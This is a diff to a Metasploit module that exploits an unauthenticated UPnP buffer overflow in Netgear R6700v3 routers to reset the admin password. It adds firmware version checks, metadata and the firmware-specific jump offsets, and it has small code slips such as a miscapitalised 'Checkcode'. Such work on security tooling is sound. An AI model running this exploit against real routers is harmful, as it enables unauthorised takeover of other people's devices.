@@ -10,18 +10,23 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'           => 'Netgear R6700v3 Unauthenticated LAN Remote Code Execution',
+        'Name'           => 'Netgear R6700v3 Unauthenticated LAN Admin Password Reset',
         'Description'    => %q{
         This module exploits a buffer overflow vulnerability in the UPNP daemon (/usr/sbin/upnpd), running on
-        the router Netgear R6700 Nighthawk, hardware version 3, ARM Architecture, firmware versions V1.0.0.4.82_10.0.57 and
-        V1.0.0.4.84_10.0.58.
+        the router Netgear R6700 Nighthawk, hardware version 3, ARM Architecture, firmware versions V1.0.0.4.82_10.0.57
+        and V1.0.0.4.84_10.0.58.
+
         The vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does
         not need any authentication to abuse it. After exploitation, an attacker can hijack execution of the upnpd binary,
         and reset the router's administrative password to "password". Next, a special packet to port 23/udp is sent
-        which will enable a telnet server on port 23/tcp. The attacker can then login to this telnet server using the new password,
-        and obtain a root shell.
+        which will enable a telnet server on port 23/tcp. The attacker can then login to this telnet server using the
+        new password, and obtain a root shell.
+
         These last two steps have to be done manually, as the authors did not reverse the communication with the web interface.
-        It should be noted that it is likely that earlier firmware versions are also vulnerable to this attack.
+        It should be noted that successful exploitation will result in the upnpd binary crashing on the target router.
+        As the upnpd binary will not restart until the router is rebooted, this means that attackers can only exploit
+        this vulnerability once per reboot of the router.
+
         This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro +
         Radek Domanski).
         },
@@ -29,7 +34,8 @@ class MetasploitModule < Msf::Auxiliary
         'Author'         =>
         [
           'Pedro Ribeiro <pedrib[at]gmail.com>', # Twitter: @pedrib1337. Vulnerability discovery and Metasploit module
-          'Radek Domanski <radek.domanski[at]gmail.com>' # Twitter: @RabbitPro. Vulnerability discovery and Metasploit module
+          'Radek Domanski <radek.domanski[at]gmail.com>', # Twitter: @RabbitPro. Vulnerability discovery and Metasploit module
+          'gwillcox-r7' # Minor general updates plus updated implementation of the check method to identify a wider range of vulnerable targets.
         ],
         'References'     =>
           [
@@ -39,6 +45,14 @@ class MetasploitModule < Msf::Auxiliary
             [ 'ZDI', '20-703'],
             [ 'ZDI', '20-704']
           ],
+        'Notes' => # Note that reliability isn't included here, as technically the exploit can only
+                   # only be run once, after which the service crashes.
+            {
+                'SideEffects' => [ CONFIG_CHANGES ], # This module will change the configuration by
+                                                     # resetting the router to the default factory password.
+                'Stability' => [ CRASH_SERVICE_DOWN ] # This module will crash the target service after it is run.
+            },
+        'RelatedModules' => [ 'exploit/linux/telnet/netgear_telnetenable' ], # This module relies on users also running exploit/linux/telnet/netgear_telnetenable to get the shell.
         'DisclosureDate' => "Jun 15 2020",
         'DefaultTarget'   => 0,
       )
@@ -49,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
       ])
   end
 
-  def get_offset
+  def get_version
     soap =
     "<?xml version=\"1.0\"?>"\
     "\r\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"\
@@ -71,34 +85,47 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     if (res == nil)
-      fail_with(Failure::Unreachable, "Failed to obtain device version: target didn't respond")
-    elsif (res.code != 200)
-      fail_with(Failure::UnexpectedReply, "Failed to obtain device version: unexpected response code")
+      fail_with(Failure::Unreachable, "Failed to obtain device version: Target didn't respond")
+    elsif (res.body.to_s == "") or (res.code != 200)
+      fail_with(Failure::UnexpectedReply, "Failed to obtain device version: Unexpected response code")
     end
 
-    if res.body.to_s =~ /V1.0.4.84/
+    version = res.body.to_s
+    version = version.scan(/V\d\.\d\.\d\.\d{1,2}/) # Try find a version number in the format V1.2.3.48 or similar.
+    if (version == nil) # Check we actually got a result.
+      fail_with(Failure::UnexpectedReply, "Failed to obtain device version: no version number found in response") # Taken from https://stackoverflow.com/questions/4115115/extract-a-substring-from-a-string-in-ruby-using-a-regular-expression
+    end
+    raw_version_number = version[0].gsub("V", "") # If we got a result, then take the first result from the returned array, and remove the leading 'V'.
+    Gem::Version.new(raw_version_number) # Finally lets turn it into a Gem::Version object for later use in other parts of the code.
+  end
+
+  def check
+    target_version = get_version
+    print_status("Target is running firmware version #{target_version}")
+    if (target_version < Gem::Version.new("1.0.4.94"))  && (target_version >= Gem::Version.new("1.0.2.62"))
+      return Exploit::CheckCode::Appears
+    else
+      return Exploit::Checkcode::Safe
+    end
+  end
+
+  def get_offset
+    target_version = get_version
+    if target_version == Gem::Version.new("1.0.4.84")
       print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.")
       # this offset is where execution will jump to
       # a part in the middle of the binary that resets the admin password
       return "\x58\x9a\x03"
-    elsif res.body.to_s =~ /V1.0.4.82/
+    elsif target_version == Gem::Version.new("1.0.4.82")
       print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.")
       return "\x48\x9a\x03"
-    end
-  end
-
-  def check
-    if get_offset
-      return Exploit::CheckCode::Vulnerable
-    else
-      return Exploit::CheckCode::Unknown
     end
   end
 
   def run
     offset = get_offset
     if not offset
-      fail_with(Failure::Unknown, "Unknown firmware version, can't proceed, please contact the authors")
+      fail_with(Failure::NoTarget, "Identified firmware version is not supported. Please contact the authors.")
     end
 
     headers =
